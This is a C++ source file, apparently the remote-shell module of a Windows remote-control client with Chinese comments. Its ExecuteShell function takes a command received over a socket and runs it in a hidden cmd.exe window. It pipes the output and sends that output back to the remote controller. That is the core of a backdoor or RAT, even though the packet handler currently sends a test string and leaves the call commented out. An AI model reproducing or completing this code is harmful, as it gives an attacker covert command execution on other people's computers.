#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {

}


CModuleShellRemote::~CModuleShellRemote() {

}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	switch (pPacket->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: {
		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);

		WCHAR pszData[30] = L"I am the test!";
		pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
		break;
	}
		

	case SHELL_CLOSE:
		break;
	}
}


DWORD CModuleShellRemote::ExecuteShell(WCHAR* pszCommand)
{
	//CTcpTran m_tcptran;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	WCHAR pszSystemPath[300] = { 0 };		//命令行缓冲
	char SendBuf[2048] = { 0 };				//发送缓冲
	SECURITY_ATTRIBUTES sa;					//安全描述符
	DWORD bytesRead = 0;
	int ret = 0;
	WCHAR pszExecuteCommand[512];			// 执行的完整命令

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		goto Clean;
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;					//进程（cmd）的输出写入管道
	si.wShowWindow=SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath));   //获取系统目录
	//strcat(pszSystemPath, "\\cmd.exe /c ");                //拼接cmd
	//strcat(pszSystemPath, pszCommand);  //拼接一条完整的cmd命令


	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);

	//wprintf(L"执行命令：%ws\n", pszSystemPath);
	//MessageBox(0, pszExecuteCommand, L"", 0);

	//创建进程，也就是执行cmd命令
	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		printf("error = 0x%x\n", GetLastError());
		goto Clean;//失败
	}
	else {
		// printf("创建进程成功\n");
	}

	//CloseHandle(hWrite);

	while (TRUE)
	{
		//无限循环读取管道中的数据，直到管道中没有数据为止
		//if (ReadFile(hRead,SendBuf,sizeof(SendBuf),&bytesRead,NULL)==0)
		//    break;
		//m_tcptran.mysend(sock,SendBuf,bytesRead,0,60);      //发送出去
		//for (int i = 0; i < bytesRead; i++){
		//	printf("0x%x ", SendBuf);
		//}
		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);
		// printf("缓冲区有%d字节数据\n", dwReadCount);
		//MessageBox(0, L"", L"", 0);
		if (!bReadSuccess) {
			break;
		}
		else {
			/*for (int i = 0; i < bytesRead; i++) {
				printf("%c", SendBuf[i]);
			}*/
			BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
			printf("???!!!!!!%d\n", m_pChildSocketClient->m_pTcpPackClient->IsConnected());
		}

		memset(SendBuf, 0, sizeof(SendBuf));  //缓冲清零
		Sleep(100);                          //休息一下
	}

	//m_tcptran.mysend(sock,(char *)MY_END,sizeof(MY_END),0,60);
Clean:
	//释放句柄
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);

	return 0;
}